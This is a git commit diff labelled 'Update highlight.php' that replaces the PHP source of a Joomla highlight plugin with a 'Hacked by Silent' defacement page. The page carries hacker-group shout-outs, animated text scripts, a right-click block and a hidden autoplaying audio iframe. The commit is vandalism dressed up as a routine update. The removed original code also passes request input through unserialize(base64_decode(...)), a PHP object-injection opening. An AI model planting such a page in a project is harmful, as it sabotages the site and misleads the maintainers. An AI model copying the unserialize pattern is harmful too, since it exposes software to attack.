31cf64166a459c455933260138e2db3c7db69154
silent619 <char_gb09@yahoo.com>
2013-03-07 17:11:23 +0700

    Update highlight.php

--- plugins/system/highlight/highlight.php
+++ plugins/system/highlight/highlight.php
@@ -1,86 +1,188 @@
-<?php
-/**
- * @package     Joomla.Plugin
- * @subpackage  System.Highlight
- *
- * @copyright   Copyright (C) 2005 - 2012 Open Source Matters, Inc. All rights reserved.
- * @license     GNU General Public License version 2 or later; see LICENSE
- */
 
-defined('JPATH_BASE') or die;
-
-/**
- * System plugin to highlight terms.
- *
- * @package     Joomla.Plugin
- * @subpackage  System.Highlight
- * @since       2.5
- */
-class PlgSystemHighlight extends JPlugin
+ <html>
+<meta content="FvcK" name="subject">
+<meta content="Hacked by Silent" name="Abstract">
+<meta name="keywords" content="Hacked, Hacker Silent, Hacked by Silent, Silent Was Here, Indonesian Hacker, Indonesian Defacer, , Indonesian Security DOwn , Indonesian Anonymouse">
+<meta content="y0u g0t HacKed" name="description">
+<meta content="G2Hax" name="copyright">
+<meta content="G2Hax" name="author">
+<title>Hack By Silent</title>
+<link rel="shortcut icon" href="http://cantigi.files.wordpress.com/2008/04/indonesia.gif" type="image/x-icon">
+<head>
+<style type="text/css">
+body
 {
-	/**
-	 * Method to catch the onAfterDispatch event.
-	 *
-	 * This is where we setup the click-through content highlighting for.
-	 * The highlighting is done with JavaScript so we just
-	 * need to check a few parameters and the JHtml behavior will do the rest.
-	 *
-	 * @return  boolean  True on success
-	 *
-	 * @since   2.5
-	 */
-	public function onAfterDispatch()
-	{
-		// Check that we are in the site application.
-		if (JFactory::getApplication()->isAdmin())
-		{
-			return true;
-		}
-
-		// Set the variables
-		$input = JFactory::getApplication()->input;
-		$extension = $input->get('option', '', 'cmd');
-
-		// Check if the highlighter is enabled.
-		if (!JComponentHelper::getParams($extension)->get('highlight_terms', 1))
-		{
-			return true;
-		}
-
-		// Check if the highlighter should be activated in this environment.
-		if (JFactory::getDocument()->getType() !== 'html' || $input->get('tmpl', '', 'cmd') === 'component')
-		{
-			return true;
-		}
-
-		// Get the terms to highlight from the request.
-		$terms = $input->request->get('highlight', null, 'base64');
-		$terms = $terms ? unserialize(base64_decode($terms)) : null;
-
-		// Check the terms.
-		if (empty($terms))
-		{
-			return true;
-		}
-
-		// Clean the terms array
-		$filter = JFilterInput::getInstance();
-
-		$cleanTerms = array();
-		foreach ($terms as $term)
-		{
-			$cleanTerms[] = $filter->clean($term, 'string');
-		}
-
-		// Activate the highlighter.
-		JHtml::_('behavior.highlighter', $cleanTerms);
-
-		// Adjust the component buffer.
-		$doc = JFactory::getDocument();
-		$buf = $doc->getBuffer('component');
-		$buf = '<br id="highlighter-start" />' . $buf . '<br id="highlighter-end" />';
-		$doc->setBuffer($buf, 'component');
-
-		return true;
-	}
+background-color:#000000;
 }
+</style>
+</head>
+<br />
+<br />
+<br />
+<center>
+<center><a rel="nofollow" href="http://www.facebook.com/thesailent"><img src="http://images5.fanpop.com/image/photos/24700000/A7X-FoREVer-avenged-sevenfold-24723760-1440-900.jpg?1362489198655" width="720" height="280"/></a></center>
+<center><h2><script language="JavaScript1.2">
+var rector=3
+var stopit=0 
+var a=1
+function init(which){
+stopit=0
+shake=which
+shake.style.left=0
+shake.style.top=0
+}
+function rattleimage(){
+if ((!document.all&&!document.getElementById)||stopit==1)
+return
+if (a==1){
+shake.style.top=parseInt(shake.style.top)+rector
+}
+else if (a==2){
+shake.style.left=parseInt(shake.style.left)+rector
+}
+else if (a==3){
+shake.style.top=parseInt(shake.style.top)-rector
+}
+else{
+shake.style.left=parseInt(shake.style.left)-rector
+}
+if (a<4)
+a++
+else
+a=1
+setTimeout("rattleimage()",50)
+}
+function stoprattle(which){
+stopit=1
+which.style.left=0
+which.style.top=0
+}
+document.oncontextmenu=new Function("return false");
+TypingText = function(element, interval, cursor, finishedCallback) {
+  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+    this.running = true;
+    return;
+  }
+  this.element = element;
+  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+  this.interval = (typeof interval == "undefined" ? 100 : interval);
+  this.origText = this.element.innerHTML;
+  this.unparsedOrigText = this.origText;
+  this.cursor = (cursor ? cursor : "");
+  this.currentText = "";
+  this.currentChar = 0;
+  this.element.typingText = this;
+  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+  TypingText.all.push(this);
+  this.running = false;
+  this.inTag = false;
+  this.tagBuffer = "";
+  this.inHTMLEntity = false;
+  this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+  if(this.running) return;
+  if(typeof this.origText == "undefined") {
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+    return;
+  }
+  if(this.currentText == "") this.element.innerHTML = "";
+  if(this.currentChar < this.origText.length) {
+    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+      this.tagBuffer = "<";
+      this.inTag = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+      this.tagBuffer += ">";
+      this.inTag = false;
+      this.currentText += this.tagBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inTag) {
+      this.tagBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+      this.HTMLEntityBuffer = "&";
+      this.inHTMLEntity = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+      this.HTMLEntityBuffer += ";";
+      this.inHTMLEntity = false;
+      this.currentText += this.HTMLEntityBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inHTMLEntity) {
+      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else {
+      this.currentText += this.origText.charAt(this.currentChar);
+    }
+    this.element.innerHTML = this.currentText;
+    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? 
+
+this.cursor(this.currentText) : this.cursor) 
+
+: "");
+    this.currentChar++;
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+  } else {
+  this.currentText = "";
+  this.currentChar = 0;
+        this.running = false;
+        this.finishedCallback();
+  }
+}
+
+</script>
+</head>
+
+
+<div id="deface1"></div>
+<p id="deface2"><font color="lime" size="4" face="monotype corsiva">
+hacked by Silent <img src="http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/19.gif"/></ b> <br>
+patch the bug </br>
+Security 1%, Bug 99%  </a> <br>
+Contact: TheSailent@facebook.com.com <br>
+<font color="white" size="3" face="monotype corsiva">Indonesian Figher Cyber - Indonesian Security Down - Anonymous Indonesia
+													  - Red-Dragon - BimaCR7 - xCrotz -Rio
+
+<script type="text/javascript">
+new TypingText(document.getElementById("deface1"));
+new TypingText(document.getElementById("deface2"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + 
+
+ar[i.length % ar.length]; });
+TypingText.runAll();
+
+</script>
+
+</script>
+</body>
+</html>
+
+<b><font size=5 color=black
+face="Papyrus"><span style='font-size:36.0pt;Papyrus:
+"Papyrus";color:black;font-weight:bold'></span></font></b></p>
+
+<center>
+
+</script>
+
+<iframe width="0%" height="0" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F64468582&amp;color=000000&amp;auto_play=true&amp;show_artwork=false"></iframe>
+</object>
+</body>
+</html> 
